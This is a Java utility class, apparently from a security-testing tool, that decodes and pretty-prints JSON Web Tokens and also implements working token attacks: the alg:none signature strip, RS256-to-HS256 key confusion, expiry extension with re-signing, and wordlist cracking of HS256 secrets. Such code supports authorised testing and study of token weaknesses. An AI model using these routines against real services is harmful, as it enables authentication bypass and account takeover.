import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.util.DefaultIndenter;
import com.fasterxml.jackson.core.util.DefaultPrettyPrinter;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.fasterxml.jackson.databind.SerializationFeature;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * JWT (JSON Web Token) transcoding: decode, pretty-print, modify, re-encode (no re-sign).
 */
public final class PayloadTranscoderJwt {

    private static final ObjectMapper OBJECT_MAPPER = new ObjectMapper();

    private PayloadTranscoderJwt() {}

    public static class JwtParts {
        public final String headerB64;
        public final String payloadB64;
        public final String signatureB64;
        public final byte[] headerBytes;
        public final byte[] payloadBytes;
        public final byte[] signatureBytes;

        public JwtParts(String headerB64, String payloadB64, String signatureB64,
                       byte[] headerBytes, byte[] payloadBytes, byte[] signatureBytes) {
            this.headerB64 = headerB64;
            this.payloadB64 = payloadB64;
            this.signatureB64 = signatureB64;
            this.headerBytes = headerBytes;
            this.payloadBytes = payloadBytes;
            this.signatureBytes = signatureBytes;
        }
    }

    public static boolean looksLikeJwt(byte[] raw) {
        if (raw == null || raw.length < 10) return false;
        String s = new String(raw, StandardCharsets.US_ASCII).trim();
        int d1 = s.indexOf('.');
        if (d1 <= 0) return false;
        int d2 = s.indexOf('.', d1 + 1);
        return d2 > d1 + 1;
    }

    public static JwtParts parseJwt(byte[] raw) {
        if (raw == null || raw.length == 0) return null;
        try {
            String s = new String(raw, StandardCharsets.US_ASCII).trim();
            int d1 = s.indexOf('.');
            if (d1 <= 0) return null;
            int d2 = s.indexOf('.', d1 + 1);
            if (d2 <= d1 + 1) return null;

            String headerB64 = s.substring(0, d1);
            String payloadB64 = s.substring(d1 + 1, d2);
            String signatureB64 = d2 + 1 < s.length() ? s.substring(d2 + 1) : "";

            byte[] headerBytes = base64UrlDecode(headerB64);
            byte[] payloadBytes = base64UrlDecode(payloadB64);
            byte[] signatureBytes = signatureB64.isEmpty() ? new byte[0] : base64UrlDecode(signatureB64);

            if (headerBytes == null || payloadBytes == null) return null;

            return new JwtParts(headerB64, payloadB64, signatureB64, headerBytes, payloadBytes, signatureBytes);
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] base64UrlDecode(String s) {
        if (s == null || s.isEmpty()) return null;
        try {
            return Base64.getUrlDecoder().decode(s);
        } catch (IllegalArgumentException e) {
            return null;
        }
    }

    private static String base64UrlEncode(byte[] bytes) {
        if (bytes == null) return "";
        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
    }

    public static byte[] jwtPrettyPrint(byte[] raw) {
        JwtParts parts = parseJwt(raw);
        if (parts == null) return null;
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("=== JWT Header ===\n");
            sb.append(prettyJson(parts.headerBytes));
            sb.append("\n\n=== JWT Payload ===\n");
            sb.append(prettyJson(parts.payloadBytes));
            sb.append("\n\n=== JWT Signature ===\n");
            if (parts.signatureBytes != null && parts.signatureBytes.length > 0) {
                sb.append("(base64url) ").append(parts.signatureB64).append("\n");
                sb.append("(hex) ").append(bytesToHex(parts.signatureBytes));
            } else {
                sb.append("(none)");
            }
            return sb.toString().getBytes(StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    public static byte[] jwtPayloadOnly(byte[] raw) {
        JwtParts parts = parseJwt(raw);
        if (parts == null || parts.payloadBytes == null) return null;
        try {
            return prettyJson(parts.payloadBytes).getBytes(StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Sign JWT with HS256. Input is existing JWT (header.payload) or raw header+payload.
     * Returns full JWT with new signature.
     */
    public static byte[] signJwtHs256(byte[] raw, byte[] secret) {
        if (raw == null || secret == null || secret.length == 0) return null;
        try {
            String s = new String(raw, StandardCharsets.US_ASCII).trim();
            String message;
            if (s.contains(".")) {
                int lastDot = s.lastIndexOf('.');
                message = lastDot > 0 ? s.substring(0, lastDot) : s;
            } else {
                message = s;
            }
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(secret, "HmacSHA256"));
            byte[] sig = mac.doFinal(message.getBytes(StandardCharsets.US_ASCII));
            String sigB64 = base64UrlEncode(sig);
            String jwt = message + "." + sigB64;
            return jwt.getBytes(StandardCharsets.US_ASCII);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * JWT alg:none attack: set header alg to "none" and remove signature.
     */
    public static byte[] jwtAlgNone(byte[] raw) {
        JwtParts parts = parseJwt(raw);
        if (parts == null) return null;
        try {
            JsonNode header = OBJECT_MAPPER.readTree(parts.headerBytes);
            ObjectNode h = (ObjectNode) header.deepCopy();
            h.put("alg", "none");
            byte[] headerBytes = OBJECT_MAPPER.writeValueAsBytes(h);
            String headerB64 = base64UrlEncode(headerBytes);
            String jwt = headerB64 + "." + parts.payloadB64 + ".";
            return jwt.getBytes(StandardCharsets.US_ASCII);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * JWT RS256→HS256 key confusion: sign with public key as HMAC secret.
     * Input: JWT + PEM/DER public key. Key is provided separately.
     */
    public static byte[] jwtRs256ToHs256(byte[] raw, byte[] publicKeyBytes) {
        if (raw == null || publicKeyBytes == null || publicKeyBytes.length == 0) return null;
        return signJwtHs256(raw, publicKeyBytes);
    }

    /**
     * Rebuild JWT with modified payload. Does not re-sign; signature becomes invalid.
     */
    public static byte[] jwtRebuild(byte[] raw, byte[] modifiedPayload) {
        JwtParts parts = parseJwt(raw);
        if (parts == null) return null;
        String payloadB64;
        if (modifiedPayload != null && modifiedPayload.length > 0) {
            payloadB64 = base64UrlEncode(modifiedPayload);
        } else {
            payloadB64 = parts.payloadB64;
        }
        String jwt = parts.headerB64 + "." + payloadB64 + "." + parts.signatureB64;
        return jwt.getBytes(StandardCharsets.UTF_8);
    }

    /**
     * Extend JWT expiry: set exp/iat/nbf and re-sign with HS256 secret.
     */
    public static byte[] jwtExtendExpiry(byte[] raw, long expSecondsFromNow, byte[] secret) {
        JwtParts parts = parseJwt(raw);
        if (parts == null || secret == null) return null;
        try {
            JsonNode payload = OBJECT_MAPPER.readTree(parts.payloadBytes);
            ObjectNode p = (ObjectNode) payload.deepCopy();
            long now = System.currentTimeMillis() / 1000;
            p.put("exp", now + expSecondsFromNow);
            p.put("iat", now);
            p.put("nbf", now);
            byte[] payloadBytes = OBJECT_MAPPER.writeValueAsBytes(p);
            String payloadB64 = base64UrlEncode(payloadBytes);
            String message = parts.headerB64 + "." + payloadB64;
            return signJwtHs256((message + ".").getBytes(StandardCharsets.US_ASCII), secret);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Crack JWT HS256 secret from wordlist. Returns "Secret: xxx" or "Not found".
     */
    public static byte[] jwtCrack(byte[] raw, byte[] wordlistBytes) {
        JwtParts parts = parseJwt(raw);
        if (parts == null || wordlistBytes == null) return null;
        String message = parts.headerB64 + "." + parts.payloadB64;
        byte[] messageBytes = message.getBytes(StandardCharsets.US_ASCII);
        String[] lines = new String(wordlistBytes, StandardCharsets.UTF_8).split("\\r?\\n");
        for (String line : lines) {
            String secret = line.trim();
            if (secret.isEmpty()) continue;
            byte[] secretBytes = secret.getBytes(StandardCharsets.UTF_8);
            byte[] computedSig = computeHmacSha256(messageBytes, secretBytes);
            if (computedSig != null && parts.signatureBytes != null
                    && Arrays.equals(computedSig, parts.signatureBytes)) {
                return ("Secret found: " + secret).getBytes(StandardCharsets.UTF_8);
            }
        }
        return "Secret not found in wordlist".getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] computeHmacSha256(byte[] message, byte[] secret) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(secret, "HmacSHA256"));
            return mac.doFinal(message);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Encode payload JSON to base64url for JWT rebuild.
     */
    public static byte[] payloadJsonToBytes(String json) {
        if (json == null || json.isEmpty()) return null;
        try {
            return json.getBytes(StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private static String prettyJson(byte[] bytes) throws JsonProcessingException {
        if (bytes == null || bytes.length == 0) return "";
        String s = new String(bytes, StandardCharsets.UTF_8);
        JsonNode node = OBJECT_MAPPER.readTree(s);
        ObjectMapper prettyMapper = new ObjectMapper();
        prettyMapper.enable(SerializationFeature.INDENT_OUTPUT);
        DefaultPrettyPrinter printer = new DefaultPrettyPrinter();
        printer.indentArraysWith(DefaultIndenter.SYSTEM_LINEFEED_INSTANCE);
        printer.indentObjectsWith(DefaultIndenter.SYSTEM_LINEFEED_INSTANCE);
        return prettyMapper.writer(printer).writeValueAsString(node);
    }

    private static String bytesToHex(byte[] bytes) {
        if (bytes == null) return "";
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            sb.append(String.format("%02x", b & 0xFF));
        }
        return sb.toString();
    }
}
